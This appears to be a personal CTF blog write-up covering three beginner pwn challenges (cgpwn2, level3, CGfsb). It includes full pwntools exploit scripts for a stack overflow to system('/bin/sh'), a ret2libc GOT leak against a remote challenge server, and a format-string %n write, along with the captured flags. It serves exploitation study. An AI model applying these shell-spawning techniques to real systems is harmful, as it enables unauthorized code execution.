## cgpwn2 | level3 | CGfsb

### **Miscellaneous**

Due to a lot of things happening in the past half month (switching major to APEX, midterm exams), and encountering problems with the new environment, there hasn't been much content related to CTF. However, there hasn't been much progress in other areas either.

Another competition is coming up soon, so I thought of quickly revisiting a few simple stack-related challenges, cramming for it in a hurry.

Initially, I intended to write a detailed write-up for each question, but it seems more basic, so I combined them all together.

### **cgpwn2**

Directly check with checksec/ida.

The intention of this challenge is quite clear: input the command ("/bin/sh") through the first `gets`, cause overflow in the second `gets`, and then call the `system` function.

> system + return address + command

So, identify the offset and addresses, and easily write the exploit:

```python
from pwn import *

context(log_level='debug')

r = process('./53c24fc5522e4a8ea2d9ad0577196b2f')

r.recvuntil('your name\\n')
r.sendline(b'/bin/sh')

cmd_addr = 0x0804A080
system_addr = 0x08048420
payload = b'A'*0x2A + p32(system_addr) + p32(0) + p32(cmd_addr)

r.recvuntil('here:\\n')
r.sendline(payload)
r.interactive()
```

Obtained flag: `cyberpeace{53e372c0f3209a11ef4429e8e2546bbf}`

### **level3**

From the description of the challenge, it seems to be an ret2libc problem, and this is my first libc leakage, so let's focus on that.

> References: CTF-WIKI

After downloading, there is a gzipped file which contains both a `.so` file and an ELF file.

(For some reason, when I extracted it using tar, the name couldn't be auto-completed, so I ended up manually generating a 32-bit MD5 file name.)

As usual, let's check with checksec (for some reason, symbolic links don't seem to work, it's frustrating me).

![https://cdn.ova.moe/img/image-20211112114145579.png](https://cdn.ova.moe/img/image-20211112114145579.png)

![https://cdn.ova.moe/img/image-20211112140131570.png](https://cdn.ova.moe/img/image-20211112140131570.png)

First, the exploit:

```python
from pwn import *

context(log_level="DEBUG")
# r = process("./level3")
r = remote("111.200.241.244", 53829)
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
func = elf.sym["vulnerable_function"]

payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
r.recvuntil("Input:\\n")
r.sendline(payload1)

write_addr = u32(r.recv(4))

write_libc = libc.sym["write"]
system_libc = libc.sym["system"]
bin_sh_libc = next(libc.search(b"/bin/sh"))
print('write_addr: ', hex(write_addr))

libc_base = write_addr - write_libc
system_addr = libc_base + system_libc
bin_sh_addr = libc_base + bin_sh_libc

print('bin_sh_addr: ', hex(bin_sh_addr))
print('system_addr: ', hex(system_addr))

payload2 = b'a'*0x88 + b'aaaa' + p32(system_addr) + p32(0) + p32(bin_sh_addr)
r.recvuntil("Input:\\n")
r.send(payload2)
r.interactive()
```

There is a strange occurrence here. While writing the exploit, I was using Python 3.10.0, but this exploit wouldn't work locally. When I switched to Python 2, it worked. The only code change made was in `bin_sh_libc`, using `generator.next()` in Python 2 and `next(generator)` in Python 3, yet the results were the same.

I compared the final payload printout between Py2 and Py3, but found no discernible difference (visually). However, the Py3 remote execution was successful. Mysterious expert-level stuff, I suppose.

### **Analysis**

The entire program is very simple, with only a `vulnerable_function` that can be exploited. The program doesn't directly use the `system` function, hence the natural progression towards GOT table leakage.

Thanks to libc's lazy binding mechanism, if we know the address of a function in libc, we can calculate the offset by subtracting its address in the program from its address in libc. Moreover, since the relative offsets of functions within the libc.so shared library are fixed, after obtaining the offset and the address of the desired function in libc, we can determine its address in the program.

```python
payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
```

Looking at `payload1`, after filling the buffer, the crucial part is setting the return address:

First, overwrite it with `write_plt`, then set `func` as the return address of `write` function. Next, fill in the three parameters for `write`. This approach allows us to capture the address of write in the GOT after write completes.

Next, calculate the offset and find the address, as explained in the exploit.

The program runs to the `read()` function again, making it easy to overwrite a `system` function address there.

### **CGfsb**

Clearly a FormatString challenge.

The aim is to ensure that the variable `pwnme` at address `0x0804A068` is set to 8.

First, identify the position of the format string argument.

```python
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(b'AAAA' + b'%x.'*0x10)
r.recvuntil("is:\\n")
print(r.recv())
```

![https://cdn.ova.moe/img/image-20211112142129570.png](https://cdn.ova.moe/img/image-20211112142129570.png)

We can see `41414141` is at the tenth argument position. So, we just need to write the address of `pwnme` and use `%n` to write 8 to it.

The final exploit:

```python
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(p32(0x0804A068) + b'AAAA' + b'%10$n')
r.interactive()
```

With this, the journey in the beginner section of PWN area concludes. Not an easy journey indeed. ðŸ¥µ
